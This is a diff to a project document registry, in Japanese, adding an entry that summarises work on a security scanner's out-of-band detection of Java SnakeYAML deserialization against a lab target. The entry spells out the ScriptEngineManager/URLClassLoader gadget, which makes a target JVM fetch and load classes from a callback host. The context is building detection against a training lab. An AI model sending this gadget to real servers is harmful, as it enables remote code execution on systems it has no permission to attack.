@@ -6186,6 +6186,21 @@ status_allowed_values:
   - docs/shigoku/worklogs/2026-09-14_sgk-2026-0497_prototype-pollution_work_log.md
   - docs/shigoku/specs/2026-09-01_sgk-2026-0465_detection-capability-map.md
   - docs/shigoku/plans/done/2026-09-14_sgk-2026-0496_oob-deserialization.md
+- provisional_id: DOC-0568
+  task_id: SGK-2026-0498
+  doc_type: plan
+  title: Java(SnakeYAML) OOB デシリアライズ(RCE級)を実対象で本物確定（◎）
+  primary_doc: docs/shigoku/plans/done/2026-09-14_sgk-2026-0498_java-snakeyaml-oob-deserialization.md
+  status: done
+  provisional: false
+  task_summary: "デシリアライズ・クラス(0496でPython pickleが◎)をJava(SnakeYAML)へ横展開。実対象SKF java-des-yaml(GET /config/{base64}→base64デコード後のYAMLをnew Yaml().load()・SnakeYAML1.25・JDK8u212・:5000・--network host)。in-bandは500空(ブラインド)だがSnakeYAMLのScriptEngineManagerガジェット(!!javax.script.ScriptEngineManager[!!java.net.URLClassLoader[[!!java.net.URL[\"<callback>/\"]]]])で標的JVMのServiceLoaderがURLClassLoaderのベースURLにMETA-INF/services/javax.script.ScriptEngineFactoryを付けて外向きHTTP取得することを実測し確定。真因切り分け: 当初コールバック不通で誤認したがJVMは13337直接到達可(jrunscript200)・真因はLocalOOBListenerのルートが単一セグメント(/callback/{token}・/{token})のみでServiceLoaderの多段パス/callback/<token>/META-INF/...に不一致=token配下未記録という我々のバグ。実装(非凍結中心+承認済み凍結1): oob_listenerにtailルートadditive追加(/callback/{token}/{tail:.*}・/{token}/{tail:.*})、oob_payload_buildersにbuilder java_snakeyaml追加、smart_blind_deserにpathモード(base64をURLパス末尾に付けGET)+GET送信+モード/kind別正確PoC(実base64URL・全インバウンド行・User-Agent)追加、oob_providerのpoll戻りに全インバウンド行interactionsをadditive追加、sealed_reproduction_checker(凍結・承認)の_check_oob_replayにpath(GET)モードadditive追加。payout_gradeは無改変(汎用マーカーoob_interaction_receivedがdeserializationを既に網羅)。実SKF E2E: 検出→payout_grade=True/oob_interaction_received→封印再現matched(新token再送→JVM再コールバック)→CONFIRMED。実poc_judgeは初回false(プレースホルダ・生ログ不足)→実base64URL+全インバウンド行+User-Agent Java/1.8.0_212+返したクラス名のOK.class取得(ServiceLoaderが攻撃者指定クラスを読むRCE級シグネチャ)を提示し再送でis_real=True/has_actual_impact=True/counter_evidence=False。新規テスト(builder・engine path・sealed path)+関連OOB/deser/provider35緑・回帰ゼロ(1339 passed)・凍結3 exit0・製品token0・秘密値非露出。RCE級・高度化中(L2)。PHP unserializeはラボ無し・POPアプリ固有で実装不可(据え置き)。凍結改変はユーザー明示承認済。"
+  parent_task_id: SGK-2026-0442
+  related_docs:
+  - docs/shigoku/plans/done/2026-09-14_sgk-2026-0498_java-snakeyaml-oob-deserialization.md
+  - docs/shigoku/reports/2026-09-14_sgk-2026-0498_java-snakeyaml-oob-deserialization_work_report.md
+  - docs/shigoku/worklogs/2026-09-14_sgk-2026-0498_java-snakeyaml-oob-deserialization_work_log.md
+  - docs/shigoku/specs/2026-09-01_sgk-2026-0465_detection-capability-map.md
+  - docs/shigoku/plans/done/2026-09-14_sgk-2026-0496_oob-deserialization.md
 - provisional_id: DOC-0566
   task_id: SGK-2026-0496
   doc_type: plan
